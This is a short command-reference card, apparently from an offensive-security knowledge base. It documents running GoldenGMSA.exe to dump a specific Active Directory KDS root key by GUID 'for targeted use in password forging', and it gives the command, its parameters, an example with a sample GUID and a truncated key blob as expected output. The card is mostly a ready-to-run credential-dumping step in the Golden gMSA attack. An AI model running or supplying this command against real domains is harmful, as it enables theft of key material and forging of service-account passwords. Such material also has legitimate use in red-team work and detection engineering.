---
id: fbd8075b-fa27-4be7-8d30-2a4efdbcad9e
name: golden-gmsa-dump-specific-kds-root-key
type: command
executor: bash
data: GoldenGMSA.exe kdsinfo --guid $_KDS_GUID
output: null
created_at: '2023-04-06T03:56:04.615486+00:00'
updated_at: '2023-04-10T20:25:56.697280+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - key-dumping
verified: true
validated: true
---

# golden-gmsa-dump-specific-kds-root-key

## Command

```bash
GoldenGMSA.exe kdsinfo --guid $_KDS_GUID
```

## Description

Dumps a specific KDS root key by GUID for targeted use in password forging.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --guid | GUID of the KDS root key (e.g., 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb) | Yes |
| kdsinfo | Subcommand for KDS info | Yes |

## Examples

### Basic Usage

```bash
GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
```

## Expected Output

The specific key blob:
```
Key: AQAAALm45UZXyuYB[...]G2/M=
```

## Related

- [[procedures/Forging-Golden-GMSA]]
- [[tools/GoldenGMSA]]
